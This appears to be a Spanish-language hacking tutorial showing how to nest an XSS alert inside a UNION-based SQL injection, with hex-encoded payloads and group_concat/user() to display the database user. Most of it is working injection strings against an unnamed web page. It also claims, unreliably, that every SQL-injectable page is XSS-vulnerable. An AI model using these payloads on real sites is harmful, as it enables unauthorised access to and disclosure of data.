# One shot payload sql and xss

En este escrito me gustaría compartir una de mis mezclas favoritas, en donde se combina una inyeccion xss dentro de una inyeccion sql para asi poder mostrar el resultado de la inyeccion sql dentro de un alert gracias a la inyeccion xss, puede sonar loco o complicado pero no, es bastante facil y trataré de explicarlo paso a paso, aqui un ejemplo del resultado: 

![](ejemplos/1.png)

Para empezar tenemos que recordar bien como se comporta una inyeccion sql, ya que, para poder insertar este payload tenemos que hacerlo en una comlumna vulnerable, para recordar bien esto recomiendo pasar por el escrito de inyecciones sql:

https://github.com/Y000o/sql_injection_basic/blob/master/sql_injection_basic.md

Una vez que tengamos la pagina con la inyeccion sql lista y tengamos el numero de columnas descubiertas, podemos empezar:

![](ejemplos/2.png)

En este caso la pagina que utilizaré tiene 21 columnas y las columnas vulnerables son 16, 17 y la numero 18. Yo estare trabajando con la numero 18.

Recordemos que siempre que una pagina es vulnerable a inyecciones sql tambien es vulnerable a inyecciones xss, para poder inyectar xss dentro de sql se hace lo siguiente:

1 - Primero se identifica la columna vulnerable con la cual se va a trabajar (en este caso la numero 18):

        `union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21+--+`

2 - Inyectamos el payload xss dentro de la columna:

        `union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,<script>alert("_Y000!_")</script>,19,20,21+--+
        
3 - Para que se mueste correctamente la inyeccion xss tenemos que pasar el codico a hexadecimal:

        `union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e,19,20,21+--+`
        
4 - El resultado es el siguiente:         

![](ejemplos/3.png)

Ahora, en este caso solo estamos inyectado xss puro y solo nos muestra un alert, para el sigiente paso vamos a usar los siguietes comandos y me gustaria explicar su funcion ya que los usaremos mas adelante:

```
\n = 5c6e =salto de linea

------ = 2d2d2d2d2d2d = lo usaremos como separador
```

NOTA= para hacer que los codigos codificados en hexadecimal funcionen en la inyeccion tenemos que poner 0x antes del codigo para que el navegador reconozca que estamos usando codico en hexadecimal y lo lea correctamente

Siguiendo con la inyeccion, vamos a introducir un poco de syntaxis sql dentro de la inyeccion xss, mas especificamente, lo que vamos a hacer es extender el alert:

El siguiente payload nos quedara asi:
`group_concat(<script>alert("xss_y_sql_by_Y000!_,/n,------,/n,usuario::,user(),")</script>)`

con todas las partes en hexadecimal:

`union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(0x3c7363726970743e616c65727428227873735f795f73716c5f62795f59303030215f,0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x5573756172696f3a3a,user(),0x22293c2f7363726970743e),19,20,21+--+`


vamos a explicar paso a paso esta inyeccion:

1 - Estamos usando "group_concat" al principio por que ya estamos integrando syntaxis sql dentro de la inyeccion xss:

          `group_concat`

2 - Ponemos el payload entre "()" ya que es la syntaxis usada para group_concat 

          `group_concat()`
          
3 - Estamos haciendo uso de caracteres especiales para personalizar el alert

          `group_concat(group_concat(<script>alert("xss_y_sql_by_Y000!_,/n,------,/n,")</script>))`
          
4 - Usamos "Usuario::" para darle un lugar especifco a "user()" el cual usamos para que la inyeccion nos muestre el usuario que la pagina nos esta dando, en este caso tenemos "root@localhost" 

          `group_concat(<script>alert("xss_y_sql_by_Y000!_,/n,------,/n,usuario::,user(),")</script>)`
          
5 - resultado:

![](ejemplos/4.png)






